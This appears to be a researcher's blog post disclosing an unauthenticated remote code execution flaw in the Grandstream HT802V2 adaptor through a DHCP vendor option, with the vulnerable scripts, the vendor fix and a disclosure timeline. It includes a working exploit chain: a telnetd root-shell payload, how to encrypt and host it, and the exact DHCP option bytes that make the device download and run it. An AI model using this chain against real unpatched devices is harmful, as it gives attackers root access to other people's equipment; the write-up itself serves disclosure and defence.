<!--
.. title: Unauthenticated RCE in Grandstream HT802V2 and probably others using gs_test_server DHCP vendor option
.. slug: unauthenticated-rce-in-grandstream-ht802v2-and-probably-others-using-gs_test_server-dhcp-vendor-option
.. date: 2025-02-20 11:38:57 UTC
.. tags: english,linux,software,hardware,planet-debian,security
.. category: 
.. link: 
.. description: 
.. type: text
-->

The [Grandstream HT802V2][ht802v2] uses busybox' `udhcpc` for DHCP.
When a DHCP event occurs, `udhcpc` calls a script (`/usr/share/udhcpc/default.script` by default) to further process the received data.
On the HT802V2 this is used to (among others) parse the data in DHCP option 43 (vendor) using the Grandstream-specific parser `/sbin/parse_vendor`.

```
…
        [ -n "$vendor" ] && {
                VENDOR_TEST_SERVER="`echo $vendor | parse_vendor | grep gs_test_server | cut -d' ' -f2`"
                if [ -n "$VENDOR_TEST_SERVER" ]; then
                        /app/bin/vendor_test_suite.sh $VENDOR_TEST_SERVER
                fi
…
```

According to the [documentation][vendor-specific-information] the format is `<option_code><value_length><value>`.
The only documented option code is `0x01` for the ACS URL.
However, if you pass other codes, these are accepted and parsed too.
Especially, if you pass `0x05` you get `gs_test_server`, which is passed in a call to `/app/bin/vendor_test_suite.sh`.

What's `/app/bin/vendor_test_suite.sh`? It's this nice script:

```
#!/bin/sh

TEST_SCRIPT=vendor_test.sh
TEST_SERVER=$1
TEST_SERVER_PORT=8080

cd /tmp

wget -q -t 2 -T 5 http://${TEST_SERVER}:${TEST_SERVER_PORT}/${TEST_SCRIPT} 
if [ "$?" = "0" ]; then
    echo "Finished downloading ${TEST_SCRIPT} from http://${TEST_SERVER}:${TEST_SERVER_PORT}"
    chmod +x ${TEST_SCRIPT}
        corefile_dec ${TEST_SCRIPT}
        if [ "`head -n 1 ${TEST_SCRIPT}`" = "#!/bin/sh" ]; then
                echo "Starting GS Test Suite..."
                ./${TEST_SCRIPT} http://${TEST_SERVER}:${TEST_SERVER_PORT}
        fi
fi
```

It uses the passed value to construct the URL `http://<gs_test_server>:8080/vendor_test.sh` and download it using `wget`.
We probably can construct a `gs_test_server` value in a way that `wget` overwrites some system file, like it was suggested in [CVE-2021-37915][CVE-2021-37915].
But we also can just let the script download the file and execute it for us.
The only hurdle is that the downloaded file gets decrypted using `corefile_dec` and the result needs to have `#!/bin/sh` as the first line to be executed.

I have no idea how the encryption works.
But luckily we already have a shell using the [OpenVPN exploit][ht802v2openvpn] and can use `/bin/encfile` to encrypt things!
The result gets correctly decrypted by `corefile_dec` back to the needed payload.

That means we can take a simple payload like:
```
#!/bin/sh
# you need exactly that shebang, yes

telnetd -l /bin/sh -p 1270 &
```

Encrypt it using `encfile` and place it on a webserver as `vendor_test.sh`.

The test machine has the IP `192.168.42.222` and `python3 -m http.server 8080` runs the webserver on the right port.

This means the value of DHCP option 43 needs to be `05`, `14` (the length of the string being the IP address) and `192.168.42.222`.

In Python:
```
>>> server = "192.168.42.222"
>>> ":".join([f'{y:02x}' for y in [5, len(server)] + [ord(x) for x in server]])
'05:0e:31:39:32:2e:31:36:38:2e:34:32:2e:32:32:32'
```

So we set DHCP option 43 to `05:0e:31:39:32:2e:31:36:38:2e:34:32:2e:32:32:32` and trigger a DHCP run (`/etc/init.d/udhcpc restart` if you have a shell, or a plain reboot if you don't).
And boom, root shell on port `1270` :)

As mentioned earlier, this is closely related to [CVE-2021-37915][CVE-2021-37915], where a binary was downloaded via TFTP from the `gdb_debug_server` NVRAM variable or via HTTP from the `gs_test_server` NVRAM variable.
Both of these variables were controllable using the existing `gs_config` interface after authentication.
But using DHCP for the same thing is much nicer, as it removes the need for authentication completely :)

## Affected devices

* HT802V2 running 1.0.3.5 (and any other release older than 1.0.3.10), as that's what I have tested
* Most probably also other HT8xxV2, as they use the same firmware
* Most probably also HT8xx(V1), as their `/etc/rc.d/init.d/openvpn` looks very similar, according to firmware dumps

## Fix

After disclosing this issue to Grandstream, they have issued a new firmware release (1.0.3.10) which modifies `/app/bin/vendor_test_suite.sh` to

```
#!/bin/sh

TEST_SCRIPT=vendor_test.sh
TEST_SERVER=$1
TEST_SERVER_PORT=8080
VENDOR_SCRIPT="/tmp/run_vendor.sh"

cd /tmp

wget -q -t 2 -T 5 http://${TEST_SERVER}:${TEST_SERVER_PORT}/${TEST_SCRIPT} 
if [ "$?" = "0" ]; then
    echo "Finished downloading ${TEST_SCRIPT} from http://${TEST_SERVER}:${TEST_SERVER_PORT}"
    chmod +x ${TEST_SCRIPT}
    prov_image_dec --in ${TEST_SCRIPT} --out ${VENDOR_SCRIPT}
    if [ "`head -n 1 ${VENDOR_SCRIPT}`" = "#!/bin/sh" ]; then
        echo "Starting GS Test Suite..."
        chmod +x ${VENDOR_SCRIPT}
        ${VENDOR_SCRIPT} http://${TEST_SERVER}:${TEST_SERVER_PORT}
    fi
fi
```

The crucial part is that now `prov_image_dec` is used for the decoding, which actually checks for a signature (like on the firmware image itself), thus preventing loading of malicious scripts.

## Timeline 

* 2025-01-05 Reported to Grandstream PSIRT via mail
* 2025-01-11 Pinged via [form on grandstream.com][vulnerability-disclosure-policy]
* 2025-01-13 Got a reply that they didn't get the initial submission, re-sent
* 2025-01-14 Confirmation that the re-sent submission was received
* 2025-01-21 [Notification that firmware 1.0.3.10 (marked as beta) for HT802V2 was released with a fix][fixed-firmware-beta]
* 2025-02-12 [1.0.3.10 is marked as "official" (aka "stable")][fixed-firmware-official]

[ht802v2]: https://www.grandstream.com/products/gateways-and-atas/analog-telephone-adaptors/product/ht802v2
[vendor-specific-information]: https://documentation.grandstream.com/knowledge-base/dhcp-options-linux-server-guide/#dhcp-option-43-vendor-specific-information
[CVE-2021-37915]: https://www.secforce.com/blog/exploiting-grandstream-ht801-ata-cve-2021-37748-cve-2021-37915/
[fixed-firmware-beta]: https://forums.grandstream.com/t/ht801v2-802v2-812v2-814v2-818v2-1-0-3-10-released-as-beta/60674
[fixed-firmware-official]: https://forums.grandstream.com/t/ht801v2-802v2-812v2-814v2-818v2-1-0-3-10-released-as-official/60847
[vulnerability-disclosure-policy]: https://www.grandstream.com/vulnerability-disclosure-policy
[ht802v2openvpn]: /2025/02/authenticated-rce-via-openvpn-configuration-file-in-grandstream-ht802v2-and-probably-others/
